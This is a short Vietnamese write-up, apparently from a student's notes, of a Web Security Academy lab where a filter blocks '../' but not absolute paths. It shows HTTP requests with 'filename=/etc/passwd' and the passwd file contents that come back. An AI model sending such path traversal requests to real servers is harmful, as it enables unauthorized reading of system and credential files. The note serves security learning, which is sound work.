![[lab-path-traversal-absolute.png]]
lab chặn `../` nhưng quên chặn absolute path.

> [!NOTE] phân tích đề
> mình thử `../../../../etc/passwd` thì bị chặn.
> response báo invalid hay không trả file.
> sau khi quan sát gói tin filename này, mình thấy server chỉ block chuỗi `../` chứ không chặn đường tuyệt đối, nên mình thử luôn `/etc/passwd`.

### hướng giải
- [ ] thử `../` confirm bị chặn
- [ ] thử `filename=/etc/passwd`
- [ ] đọc response check `root:x:`

### giải
request fail:

```http
GET /image?filename=../../../../etc/passwd HTTP/1.1
Host: 0a2c00d404b3xxxx.web-security-academy.net
```

-> bị block.
=> mình đổi sang absolute:

```http
GET /image?filename=/etc/passwd HTTP/1.1
Host: 0a2c00d404b3xxxx.web-security-academy.net
```

response:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

-> không cần `../` mà vẫn đọc được.
=> solved.

liên quan:
- [[lys thuyet path traversal]]
- [[path traversal]]
- [[Lab-Path traversal simple]]
- [[Lab-Path traversal non-recursive strip]]

> [!NOTE] bài học
> sau khi quan sát lab này mình thấy...
> blacklist `../` là chưa đủ.
> nên mình khi bypass luôn nhớ thử absolute path đầu tiên.
> đơn giản mà hay lọt.
